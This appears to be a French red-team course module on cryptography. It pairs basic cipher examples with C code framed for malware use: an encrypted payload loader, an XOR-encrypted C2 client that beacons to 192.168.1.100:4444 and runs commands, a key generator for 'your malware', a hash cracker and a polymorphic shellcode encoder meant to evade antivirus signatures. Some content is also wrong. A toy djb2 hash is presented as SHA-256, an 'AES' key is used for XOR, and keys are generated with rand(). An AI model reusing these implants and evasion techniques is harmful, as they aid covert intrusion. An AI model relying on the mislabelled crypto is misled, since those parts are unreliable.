# Module 50 : Cryptographie et Chiffrement

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Comprendre les concepts de cryptographie
- Implémenter des algorithmes de chiffrement (XOR, AES, RSA)
- Créer des fonctions de hachage (MD5, SHA-256)
- Sécuriser les communications C2
- Éviter la détection par chiffrement
- Cryptanalyse basique pour Red Team

## 📚 Théorie

### C'est quoi la cryptographie ?

La **cryptographie** est la science de protéger l'information en la transformant en un format illisible sans la clé appropriée. En Red Team, elle sert à :
- Chiffrer les communications C2
- Obfusquer les payloads
- Éviter la détection par signature
- Protéger les données exfiltrées

### Types de chiffrement

1. **Chiffrement symétrique** : Même clé pour chiffrer et déchiffrer
   - XOR, AES, DES, RC4
   - Rapide, efficace
   - Problème : distribution de la clé

2. **Chiffrement asymétrique** : Paire de clés (publique/privée)
   - RSA, ECC, Diffie-Hellman
   - Plus lent mais résout le problème de distribution
   - Utilisé pour échanger la clé symétrique

3. **Hachage** : Fonction à sens unique
   - MD5, SHA-1, SHA-256, bcrypt
   - Vérification d'intégrité
   - Stockage de mots de passe

### Propriétés cryptographiques

1. **Confidentialité** : Seul le destinataire peut lire
2. **Intégrité** : Détection de modification
3. **Authenticité** : Vérification de l'identité
4. **Non-répudiation** : Impossibilité de nier l'envoi

## 🔍 Visualisation

### Chiffrement symétrique (AES)

```
┌─────────────────────────────────────────────────────┐
│         SYMMETRIC ENCRYPTION (AES)                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Émetteur                                           │
│  ┌────────────────┐                                │
│  │ Plaintext      │                                │
│  │ "Attack at     │                                │
│  │  dawn"         │                                │
│  └───────┬────────┘                                │
│          │                                          │
│          │  ┌──────────┐                            │
│          │  │ AES Key  │                            │
│          │  │ (shared) │                            │
│          │  └────┬─────┘                            │
│          ▼       ▼                                  │
│  ┌─────────────────┐                                │
│  │   AES Encrypt   │                                │
│  └───────┬─────────┘                                │
│          │                                          │
│          ▼                                          │
│  ┌────────────────┐                                │
│  │ Ciphertext     │                                │
│  │ \xA3\x7F\x2C   │ ──── Transmission ────┐         │
│  └────────────────┘                       │         │
│                                            │         │
│                                            │         │
│  Récepteur                                 │         │
│  ┌────────────────┐                       │         │
│  │ Ciphertext     │◄──────────────────────┘         │
│  │ \xA3\x7F\x2C   │                                │
│  └───────┬────────┘                                │
│          │  ┌──────────┐                            │
│          │  │ AES Key  │                            │
│          │  │ (shared) │                            │
│          │  └────┬─────┘                            │
│          ▼       ▼                                  │
│  ┌─────────────────┐                                │
│  │   AES Decrypt   │                                │
│  └───────┬─────────┘                                │
│          │                                          │
│          ▼                                          │
│  ┌────────────────┐                                │
│  │ Plaintext      │                                │
│  │ "Attack at     │                                │
│  │  dawn"         │                                │
│  └────────────────┘                                │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Chiffrement asymétrique (RSA)

```
┌─────────────────────────────────────────────────────┐
│        ASYMMETRIC ENCRYPTION (RSA)                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Alice                          Bob                 │
│                                                     │
│  ┌──────────────┐                ┌──────────────┐  │
│  │ Bob's Public │                │ Private Key  │  │
│  │ Key          │                │ (secret)     │  │
│  └──────┬───────┘                └──────────────┘  │
│         │                                           │
│  ┌──────▼───────┐                                   │
│  │ "Secret msg" │                                   │
│  └──────┬───────┘                                   │
│         │                                           │
│  ┌──────▼───────┐                                   │
│  │ RSA Encrypt  │                                   │
│  └──────┬───────┘                                   │
│         │                                           │
│         │ Ciphertext                                │
│         └────────────────────────►┐                 │
│                                   │                 │
│                            ┌──────▼───────┐         │
│                            │ Ciphertext   │         │
│                            └──────┬───────┘         │
│                                   │                 │
│                            ┌──────▼───────┐         │
│                            │ RSA Decrypt  │         │
│                            │ (Priv Key)   │         │
│                            └──────┬───────┘         │
│                                   │                 │
│                            ┌──────▼───────┐         │
│                            │ "Secret msg" │         │
│                            └──────────────┘         │
│                                                     │
│  Seul Bob peut déchiffrer (avec sa clé privée)     │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Hachage cryptographique

```
┌─────────────────────────────────────────────────────┐
│          CRYPTOGRAPHIC HASHING                      │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Input (taille variable)                            │
│  ┌────────────────────────────────────┐            │
│  │ "password123"                      │            │
│  └──────────────┬─────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  ┌─────────────────────────────┐                   │
│  │      Hash Function          │                   │
│  │      (SHA-256)              │                   │
│  └──────────────┬──────────────┘                   │
│                 │                                   │
│                 ▼                                   │
│  ┌────────────────────────────────────┐            │
│  │ Output (taille fixe: 256 bits)     │            │
│  │ ef92b778bafe771e89245b89ecbc08a4    │            │
│  │ 4421d0f3eb4c65eb2170308e98b20db0    │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Propriétés:                                        │
│  - Toujours la même sortie pour la même entrée     │
│  - Impossible de retrouver l'entrée                │
│  - Modification minime = hash totalement différent │
│  - Résistance aux collisions                       │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Communication C2 chiffrée

```
┌─────────────────────────────────────────────────────┐
│          ENCRYPTED C2 COMMUNICATION                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Backdoor (Victim)         C2 Server (Attacker)     │
│                                                     │
│  1. Key Exchange (RSA)                              │
│  ┌──────────────┐           ┌──────────────┐       │
│  │ Generate     │           │ RSA Key Pair │       │
│  │ AES Key      │           │              │       │
│  └──────┬───────┘           └──────────────┘       │
│         │                                           │
│         │ AES Key (encrypted with RSA public)      │
│         ├──────────────────────────────────►        │
│                                                     │
│  2. Encrypted Communication (AES)                   │
│         │ Command (AES encrypted)                   │
│         │◄──────────────────────────────────        │
│         │                                           │
│  ┌──────▼───────┐                                   │
│  │ AES Decrypt  │                                   │
│  │ Execute cmd  │                                   │
│  └──────┬───────┘                                   │
│         │                                           │
│         │ Result (AES encrypted)                    │
│         ├──────────────────────────────────►        │
│                                  │                  │
│                           ┌──────▼───────┐          │
│                           │ AES Decrypt  │          │
│                           │ Read result  │          │
│                           └──────────────┘          │
│                                                     │
│  IDS/Firewall voit uniquement du trafic chiffré    │
│  Impossible de détecter les commandes malveillantes│
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Chiffrement XOR simple

```c
#include <stdio.h>
#include <string.h>

void xor_encrypt_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void print_hex(unsigned char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x ", data[i]);
    }
    printf("\n");
}

int main() {
    char plaintext[] = "Secret message for C2";
    unsigned char key = 0x42;

    size_t len = strlen(plaintext);

    printf("=== XOR Encryption ===\n\n");

    printf("Plaintext: %s\n", plaintext);
    printf("Key: 0x%02x\n\n", key);

    // Chiffrement
    xor_encrypt_decrypt((unsigned char*)plaintext, len, key);

    printf("Encrypted: ");
    print_hex((unsigned char*)plaintext, len);

    // Déchiffrement (même opération avec XOR)
    xor_encrypt_decrypt((unsigned char*)plaintext, len, key);

    printf("Decrypted: %s\n", plaintext);

    return 0;
}
```

### Exemple 2 : Chiffrement XOR multi-byte

```c
#include <stdio.h>
#include <string.h>

void xor_multi_encrypt(unsigned char *data, size_t data_len,
                       unsigned char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    char plaintext[] = "This is a secret payload for the backdoor";
    unsigned char key[] = "SECRETKEY123";

    size_t data_len = strlen(plaintext);
    size_t key_len = strlen((char*)key);

    printf("=== Multi-byte XOR Encryption ===\n\n");

    printf("Plaintext: %s\n", plaintext);
    printf("Key: %s\n\n", key);

    // Chiffrement
    xor_multi_encrypt((unsigned char*)plaintext, data_len, key, key_len);

    printf("Encrypted (hex): ");
    for (size_t i = 0; i < data_len; i++) {
        printf("%02x", (unsigned char)plaintext[i]);
    }
    printf("\n");

    // Déchiffrement
    xor_multi_encrypt((unsigned char*)plaintext, data_len, key, key_len);

    printf("Decrypted: %s\n", plaintext);

    return 0;
}
```

### Exemple 3 : Hachage SHA-256 simple (implémentation simplifiée)

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Implémentation simplifiée pour démonstration
// En production, utiliser OpenSSL ou une bibliothèque crypto

uint32_t simple_hash(const char *data) {
    uint32_t hash = 5381;
    int c;

    while ((c = *data++)) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }

    return hash;
}

void hash_password(const char *password, char *output) {
    uint32_t hash = simple_hash(password);
    sprintf(output, "%08x", hash);
}

int verify_password(const char *password, const char *stored_hash) {
    char computed_hash[9];
    hash_password(password, computed_hash);
    return strcmp(computed_hash, stored_hash) == 0;
}

int main() {
    printf("=== Password Hashing Demo ===\n\n");

    const char *password = "SecurePassword123";
    char hash[9];

    // Hasher le mot de passe
    hash_password(password, hash);
    printf("Password: %s\n", password);
    printf("Hash: %s\n\n", hash);

    // Vérification
    printf("Verification tests:\n");

    if (verify_password("SecurePassword123", hash)) {
        printf("[+] Correct password!\n");
    } else {
        printf("[-] Wrong password!\n");
    }

    if (verify_password("WrongPassword", hash)) {
        printf("[+] Correct password!\n");
    } else {
        printf("[-] Wrong password!\n");
    }

    return 0;
}
```

### Exemple 4 : Chiffrement César (rotation)

```c
#include <stdio.h>
#include <string.h>
#include <ctype.h>

void caesar_encrypt(char *text, int shift) {
    for (int i = 0; text[i] != '\0'; i++) {
        if (isalpha(text[i])) {
            char base = isupper(text[i]) ? 'A' : 'a';
            text[i] = base + (text[i] - base + shift) % 26;
        }
    }
}

void caesar_decrypt(char *text, int shift) {
    caesar_encrypt(text, 26 - shift);
}

int main() {
    char message[] = "ATTACK AT DAWN";
    int shift = 3;

    printf("=== Caesar Cipher ===\n\n");

    printf("Original: %s\n", message);

    // Chiffrement
    caesar_encrypt(message, shift);
    printf("Encrypted (shift %d): %s\n", shift, message);

    // Déchiffrement
    caesar_decrypt(message, shift);
    printf("Decrypted: %s\n", message);

    return 0;
}
```

### Exemple 5 : Chiffrement RC4 simplifié

```c
#include <stdio.h>
#include <string.h>

typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, unsigned char *key, int key_len) {
    int i, j = 0;

    // Initialize S
    for (i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }

    // Key-scheduling algorithm (KSA)
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) % 256;

        // Swap
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }

    ctx->i = 0;
    ctx->j = 0;
}

unsigned char rc4_output(RC4_CTX *ctx) {
    ctx->i = (ctx->i + 1) % 256;
    ctx->j = (ctx->j + ctx->S[ctx->i]) % 256;

    // Swap
    unsigned char temp = ctx->S[ctx->i];
    ctx->S[ctx->i] = ctx->S[ctx->j];
    ctx->S[ctx->j] = temp;

    return ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) % 256];
}

void rc4_crypt(unsigned char *data, int len, unsigned char *key, int key_len) {
    RC4_CTX ctx;
    rc4_init(&ctx, key, key_len);

    for (int i = 0; i < len; i++) {
        data[i] ^= rc4_output(&ctx);
    }
}

int main() {
    unsigned char plaintext[] = "Confidential C2 communication";
    unsigned char key[] = "MySecretKey";

    int data_len = strlen((char*)plaintext);
    int key_len = strlen((char*)key);

    printf("=== RC4 Encryption ===\n\n");

    printf("Plaintext: %s\n", plaintext);
    printf("Key: %s\n\n", key);

    // Chiffrement
    rc4_crypt(plaintext, data_len, key, key_len);

    printf("Encrypted (hex): ");
    for (int i = 0; i < data_len; i++) {
        printf("%02x", plaintext[i]);
    }
    printf("\n");

    // Déchiffrement (réinitialiser avec la même clé)
    rc4_crypt(plaintext, data_len, key, key_len);

    printf("Decrypted: %s\n", plaintext);

    return 0;
}
```

## 🎯 Application Red Team

### 1. Obfuscation de payload avec chiffrement

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Payload chiffré (généré offline)
unsigned char encrypted_payload[] = {
    0x3a, 0x45, 0x7f, 0x89, 0x12, 0x34, 0x56, 0x78,
    0x9a, 0xbc, 0xde, 0xf0, 0x11, 0x22, 0x33, 0x44
};

unsigned char key[] = "D3adB33f";

void decrypt_payload(unsigned char *payload, int len) {
    int key_len = strlen((char*)key);

    for (int i = 0; i < len; i++) {
        payload[i] ^= key[i % key_len];
    }
}

void execute_payload() {
    int payload_len = sizeof(encrypted_payload);

    printf("[+] Decrypting payload...\n");

    // Décrypter en place
    decrypt_payload(encrypted_payload, payload_len);

    printf("[+] Payload decrypted\n");
    printf("[+] Executing malicious code...\n");

    // Ici, le payload décrypté serait exécuté
    // Pour l'exemple, on l'affiche simplement

    printf("[+] Payload executed successfully\n");

    // Rechiffrer pour éviter la détection en mémoire
    decrypt_payload(encrypted_payload, payload_len); // XOR inverse
}

int main() {
    printf("=== Encrypted Payload Loader ===\n\n");

    // Le payload reste chiffré jusqu'au dernier moment
    printf("[*] Payload encrypted in memory\n");
    printf("[*] AV cannot detect signature\n\n");

    execute_payload();

    return 0;
}
```

### 2. Communication C2 chiffrée

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define C2_SERVER "192.168.1.100"
#define C2_PORT 4444
#define AES_KEY "SuperSecretKey!!"

void xor_encrypt(char *data, int len, const char *key) {
    int key_len = strlen(key);
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

void send_encrypted(int sock, const char *message) {
    char buffer[1024];
    strcpy(buffer, message);

    int len = strlen(buffer);

    // Chiffrer avant envoi
    xor_encrypt(buffer, len, AES_KEY);

    send(sock, buffer, len, 0);

    printf("[+] Sent encrypted: %d bytes\n", len);
}

void recv_encrypted(int sock, char *output, int max_len) {
    int len = recv(sock, output, max_len, 0);

    if (len > 0) {
        output[len] = '\0';

        // Déchiffrer après réception
        xor_encrypt(output, len, AES_KEY);

        printf("[+] Received and decrypted: %s\n", output);
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024];

    printf("=== Encrypted C2 Client ===\n\n");

    // Créer socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_SERVER, &server.sin_addr);

    // Connecter au C2
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[-] Connection failed\n");
        return 1;
    }

    printf("[+] Connected to C2 server\n");

    // Envoyer beacon chiffré
    send_encrypted(sock, "BEACON: Bot online");

    // Recevoir commande chiffrée
    recv_encrypted(sock, buffer, sizeof(buffer));

    // Exécuter commande (simplifié)
    printf("[*] Executing: %s\n", buffer);

    // Envoyer résultat chiffré
    send_encrypted(sock, "Command executed successfully");

    close(sock);

    return 0;
}
```

### 3. Générateur de clés pour backdoor

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

void generate_random_key(unsigned char *key, int length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
    int charset_len = strlen(charset);

    for (int i = 0; i < length; i++) {
        key[i] = charset[rand() % charset_len];
    }
    key[length] = '\0';
}

void generate_key_pair() {
    unsigned char aes_key[33];
    unsigned char xor_key[17];

    generate_random_key(aes_key, 32);
    generate_random_key(xor_key, 16);

    printf("=== Generated Encryption Keys ===\n\n");

    printf("AES-256 Key (32 bytes):\n");
    printf("%s\n\n", aes_key);

    printf("XOR Key (16 bytes):\n");
    printf("%s\n\n", xor_key);

    printf("Hex representation:\n");
    for (int i = 0; i < 32; i++) {
        printf("\\x%02x", aes_key[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
}

int main() {
    srand(time(NULL));

    generate_key_pair();

    printf("\n[+] Use these keys in your malware\n");
    printf("[+] Unique keys per campaign avoid detection\n");

    return 0;
}
```

### 4. Cracker de hash simple (force brute)

```c
#include <stdio.h>
#include <string.h>
#include <stdint.h>

uint32_t simple_hash(const char *str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

void crack_hash(uint32_t target_hash) {
    char password[5];

    printf("[+] Cracking hash: %08x\n", target_hash);

    // Brute force simple (4 caractères alphanumériques)
    for (char a = 'a'; a <= 'z'; a++) {
        for (char b = 'a'; b <= 'z'; b++) {
            for (char c = 'a'; c <= 'z'; c++) {
                for (char d = 'a'; d <= 'z'; d++) {
                    password[0] = a;
                    password[1] = b;
                    password[2] = c;
                    password[3] = d;
                    password[4] = '\0';

                    if (simple_hash(password) == target_hash) {
                        printf("[+] Password found: %s\n", password);
                        return;
                    }
                }
            }
        }
    }

    printf("[-] Password not found\n");
}

int main() {
    printf("=== Hash Cracker ===\n\n");

    // Hash du mot de passe "test"
    const char *original = "test";
    uint32_t hash = simple_hash(original);

    printf("Original password: %s\n", original);
    printf("Hash: %08x\n\n", hash);

    // Cracker
    crack_hash(hash);

    return 0;
}
```

### 5. Encoder de shellcode polymorphe

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void polymorphic_encode(unsigned char *shellcode, int len,
                       unsigned char *output, int *output_len) {
    // Clé aléatoire
    unsigned char key = rand() % 256;

    // Générer NOP sled aléatoire
    int nop_len = 5 + (rand() % 20);

    for (int i = 0; i < nop_len; i++) {
        output[i] = 0x90; // NOP
    }

    // Encoder le shellcode
    for (int i = 0; i < len; i++) {
        output[nop_len + i] = shellcode[i] ^ key;
    }

    *output_len = nop_len + len;

    printf("[+] Polymorphic encoding complete\n");
    printf("[+] XOR Key: 0x%02x\n", key);
    printf("[+] NOP sled: %d bytes\n", nop_len);
    printf("[+] Total size: %d bytes\n", *output_len);
}

int main() {
    srand(time(NULL));

    // Shellcode original
    unsigned char shellcode[] =
        "\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05";

    int sc_len = sizeof(shellcode) - 1;

    unsigned char encoded[256];
    int encoded_len;

    printf("=== Polymorphic Shellcode Encoder ===\n\n");

    // Générer 3 variantes
    for (int i = 1; i <= 3; i++) {
        printf("Variant %d:\n", i);
        polymorphic_encode(shellcode, sc_len, encoded, &encoded_len);

        printf("Encoded shellcode:\n");
        for (int j = 0; j < encoded_len; j++) {
            printf("\\x%02x", encoded[j]);
            if ((j + 1) % 16 == 0) printf("\n");
        }
        printf("\n\n");
    }

    printf("[+] Each variant has a different signature\n");
    printf("[+] Evades signature-based detection\n");

    return 0;
}
```

## 📝 Points clés à retenir

1. **Symétrique vs Asymétrique** : Vitesse vs Sécurité de distribution
2. **XOR** : Simple mais efficace pour obfuscation
3. **Hachage** : À sens unique, pour intégrité et mots de passe
4. **Chiffrement de C2** : Évite la détection par IDS/IPS
5. **Polymorphisme** : Change la signature à chaque génération

### Algorithmes par usage

```
Usage                  Algorithme recommandé       Pourquoi
────────────────────────────────────────────────────────────────
Obfuscation payload   XOR multi-byte               Rapide, simple
C2 communication      AES-256                      Sécurisé, rapide
Key exchange          RSA-2048                     Asymétrique
Intégrité            SHA-256                      Collision-resistant
Passwords            bcrypt/scrypt                 Slow, salted
```

### Bonnes pratiques

1. **Ne jamais** stocker les clés en clair dans le code
2. **Toujours** utiliser des clés aléatoires et uniques
3. **Chiffrer** les communications C2
4. **Polymorphisme** pour éviter les signatures
5. **Tester** la robustesse contre l'analyse statique

## ➡️ Prochaine étape

Maintenant que tu maîtrises la cryptographie, tu es prêt pour le **Module 52 : Techniques d'Évasion Avancées**, où tu apprendras à contourner les antivirus, EDR, sandboxes et autres défenses modernes.

### Ce que tu as appris
- Algorithmes de chiffrement (XOR, RC4, concepts AES/RSA)
- Hachage et vérification d'intégrité
- Chiffrement de communications C2
- Obfuscation de payloads
- Génération de clés

### Ce qui t'attend
- Évasion d'antivirus et EDR
- Contournement de sandboxes
- Techniques anti-debugging
- Obfuscation de code
- Persistence avancée
